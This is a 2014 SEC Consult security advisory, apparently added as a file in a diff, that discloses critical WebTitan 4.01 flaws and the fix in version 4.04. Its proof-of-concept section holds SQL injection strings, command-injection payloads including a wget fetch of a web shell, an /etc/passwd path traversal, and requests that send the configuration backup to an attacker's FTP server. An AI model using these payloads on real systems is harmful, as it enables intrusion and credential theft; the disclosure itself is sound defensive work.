@@ -1,0 +1,157 @@
+SEC Consult Vulnerability Lab Security Advisory < 20140606-0 >
+=======================================================================
+              title: Multiple critical vulnerabilities
+            product: WebTitan
+ vulnerable version: 4.01 (Build 68)
+      fixed version: 4.04
+             impact: critical
+           homepage: http://www.webtitan.com
+              found: 2014-04-07
+                 by: Robert Giruckas, Mindaugas Liudavicius
+                     SEC Consult Vulnerability Lab
+                     https://www.sec-consult.com
+=======================================================================
+
+Vendor description:
+-------------------
+"WebTitan offers ultimate protection from internet based threats and powerful
+web filtering functionalities to SMBs, Service Providers and Education sectors
+around the World."
+
+Source: http://www.webtitan.com/about-us/webtitan
+
+
+Business recommendation:
+------------------------
+Multiple critical security vulnerabilities have been identified in the WebTitan
+system. Exploiting these vulnerabilities potential attackers could take control
+over the entire system.
+
+It is highly recommended by SEC Consult not to use this software until a
+thorough security review has been performed by security professionals and all
+identified issues have been resolved.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) SQL Injection
+A SQL injection vulnerability in the /categories-x.php script allows
+unauthenticated remote attackers to execute arbitrary SQL commands via the
+"sortkey" parameter.
+
+2) Remote command execution
+Multiple remote command execution vulnerabilities were detected in the
+WebTitan GUI. This security flaw exists due to lack of input validation. An
+authenticated attacker of any role (Administrator, Policy Manager, Report
+Manager) can execute arbitrary OS commands with the privileges of the web
+server.
+
+3) Path traversal
+The web GUI fails to properly filter user input passed to the logfile
+parameter. This leads to arbitrary file download by unauthenticated attackers.
+
+4) Unprotected Access
+The web GUI does not require authentication for certain PHP scripts. This
+security issue allows an unauthenticated remote attacker to download Webtitan
+configuration backup (including hashed user credentials) to the attacker's FTP
+server.
+
+
+Proof of concept:
+-----------------
+1) SQL Injection
+The manipulation of the "sortkey" parameter allows users to modify the
+original SQL query.
+
+    GET /categories-x.php HTTP/1.1
+    /categories-x.php?getcategories&sortkey=name) limit 1;--
+    /categories-x.php?getcategories&sortkey=name) limit 5;--
+
+2) Remote command execution
+Due to improper user input validation it is possible to inject arbitrary OS
+commands using backticks ``. Some of the affected files do not sanitize any
+type of shell metacharacters, this allows an attacker to use more flexible OS
+commands. Tested and working payload for most scripts: `/usr/local/bin/wget
+http://<URL to shell script> -O /usr/blocker/www/graph/CPU/xshell.php`
+
+Affected scripts: logs-x.php, users-x.php, support-x.php, time-x.php,
+scheduledreports-x.php, reporting-x.php, network-x.php
+
+    a. logs-x.php, vulnerable parameters: fname, logfile
+        /logs-x.php?jaction=view&fname=webtitan.log;ls -la
+        /logs-x.php POST Content: jaction=delete&logfile=<PAYLOAD>
+
+    b. users-x.php, vulnerable parameters: ldapserver
+       /users-x.php?findLdapDC=1&ldapserver=<PAYLOAD>
+
+    c. support-x.php, vulnerable parameters: tracehost, dighost, pinghost
+        /support-x.php POST Content: jaction=ping&pinghost=<PAYLOAD>
+        /support-x.php POST Content: jaction=ping&dighost=<PAYLOAD>
+        /support-x.php POST Content: jaction=ping&tracehost=<PAYLOAD>
+
+    d. time-x.php, vulnerable parameters: ntpserversList
+       /time-x.php POST Content:
+jaction=ntpSync&timezone=Europe%2FLondon&ntp=1&ntpservers_entry=&date_month=4&date_day=8&date_year=2014&h_time=9&m_time=57&ntpserversList=<PAYLOAD>
+
+    e. scheduledreports-x.php, vulnerable parameters: reportid
+       /scheduledreports-x.php?runReport=1&reportid=<PAYLOAD>
+
+    f. reporting-x.php, vulnerable parameter: delegated_admin
+       /reporting-x.php POST Content:
+jaction=exportpdf&report=r_requests_user&period=period_today&uid=0&sourceip=0&urlid=0&groupid=0&categoryid=0&domain=&chart=pie&reporthtml=&reportid=1396860686&rowsperpage=10&currentpage=1&startdate=1396843200&enddate=1396929599&reportfilter=f_0&delegated_admin=admin';<PAYLOAD>'&gotopage=1
+
+    g. network-x.php, vulnerable parameters: hostname (limited to 15 symbols
+       length), domain
+       jaction=saveHostname&hostname=`root`
+       jaction=saveDNS&domain=domain.com;<PAYLOAD>&dnsservers=192.168.0.1-:-
+
+
+3) Path traversal
+Due to missing input filtering in the logs-x.php script it is possible to
+download arbitrary files without any authentication:
+
+    Vulnerable parameters: logfile
+    Post Content: jaction=download&logfile=../../../etc/passwd
+
+4) Unprotected Access
+    a. Since the script backup-x.php does not require authentication, remote
+       attackers can initiate a backup of Webtitan configuration files to a remote
+       FTP server by executing the following requests:
+
+       /backup-x.php
+       POST Content:
+jaction=saveFTP&jstatus=&schedule=1&frequency=daily&hour=16&minute=38&day_of_week=Mon&day_of_month=1&ftpserver=<IP>&ftplogin=<login>&ftppassword=<pw>&ftplocation=<path>
+
+       Where <IP> is the remote FTP server IP, <login> - remote FTP server
+       login, <password> - remote FTP, <path> - path where to store backup
+
+       With the next request, an attacker can force the backup to be uploaded
+       to the attacker's FTP server:
+
+       /backup-x.php
+       POST Content: jaction=exportNowtoFtp
+
+     b. The autoconf-x.php, contentfiltering-x.php, license-x.php, msgs.php,
+        reports-drill.php scripts can be reached by an unauthenticated user. The
+        categories-x.php, urls-x.php can also be accessed by faking the HTTP User-Agent
+        header, by setting it to "Shockwave Flash".
+
+
+Vulnerable / tested versions:
+-----------------------------
+The vulnerabilities have been verified to exist in the WebTitan VMware
+appliance ver. 4.0.1 (build 68). It is assumed that previous versions are
+affected too.
+
+
+Vendor contact timeline:
+------------------------
+2014-04-17: Contacting vendor through info@webtitan.com and helpdesk@webtitan.com
+2014-04-23: Vendor is investigating the vulnerabilities
+2014-05-09: Vendor is testing security patches
+2014-06-03: Vendor releases the version 4.04 of WebTitan
+2014-06-06: SEC Consult releases a coordinated security advisory
+
+
+Solution:
+> -------- Update to the most recent version 4.04 of WebTitan. Workaround: ----------- Advisory URL: ------------- https://www.sec-consult.com/en/Vulnerability-Lab/Advisories.htm ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ SEC Consult Vulnerability Lab SEC Consult Vienna - Bangkok - Frankfurt/Main - Montreal - Singapore - Vilnius Headquarter: Mooslackengasse 17, 1190 Vienna, Austria Phone: +43 1 8903043 0 Fax: +43 1 8903043 15 Mail: research at sec-consult dot com Web: https://www.sec-consult.com Blog: http://blog.sec-consult.com Twitter: https://twitter.com/sec_consult Interested to work with the experts of SEC Consult? Write to career@sec-consult.com EOF Mindaugas Liudavicius / @2014
